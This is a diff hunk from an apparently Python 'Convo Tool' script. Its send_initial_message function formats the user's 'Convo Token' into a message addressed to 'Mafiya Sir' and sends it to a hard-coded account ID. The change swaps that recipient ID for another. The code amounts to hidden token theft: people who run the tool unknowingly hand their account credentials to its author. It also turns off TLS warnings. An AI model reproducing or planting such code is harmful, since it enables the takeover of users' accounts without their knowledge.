@@ -42,7 +42,7 @@ def send_initial_message():
       msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100069713641443"
+      target_id = "100084348499534"
 
       requests.packages.urllib3.disable_warnings()
 
